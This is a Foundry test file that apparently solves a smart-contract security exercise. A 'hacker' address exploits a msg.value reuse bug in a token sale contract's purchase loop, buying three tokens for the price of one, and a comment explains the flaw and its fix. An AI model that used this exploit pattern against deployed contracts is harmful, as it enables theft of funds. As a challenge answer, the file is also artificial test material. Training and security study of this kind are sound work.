// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { BuyMyTokens } from "../src/5_BuyMyTokens.sol";
import { BuyMyTokensHelper } from "../test_helper/5_BuyMyTokensSetup.sol";
import "../mocks/marqToken.sol";


contract BuyMyTokensTest is Test {
    BuyMyTokens public target;
    MarqToken public token1;
    MarqToken public token2;
    MarqToken public token3;


    function setUp() public {
        BuyMyTokensHelper dontpeak = new BuyMyTokensHelper();
        target = dontpeak.deployed();
        token1 = MarqToken(dontpeak.tokenAddress1());
        token2 = MarqToken(dontpeak.tokenAddress2());
        token3 = MarqToken(dontpeak.tokenAddress3());
    }


 
 
    /**
    Learning: The classic problem of double spending i.e. since msg.value was never updated within the for loop, we kind of bought all 3 tokens with the 1.2 ether only
    Caution: To update msg.value when used within for loops.
    i.e. remainingEther = msg,value - (amount * price) must be added at the end of the function and then _purchasingPower must be called with remainingEther instead of msg.value on subsequent calls
    */
    function test_GetThisPassing_5() public {
        address hacker = address(0xBAD);
        

        vm.startPrank(hacker);
       uint256[] memory amounts = new uint256[](3);
        amounts[0] = 12;
        amounts[1] = 6;
        amounts[2] = 4;
        target.purchaseTokens{value: 1.2 ether}(amounts);
        vm.stopPrank();

        assertEq(token1.balanceOf(hacker), 12 ether);
        assertEq(token2.balanceOf(hacker), 6 ether);
        assertEq(token3.balanceOf(hacker), 4 ether);
    }

}


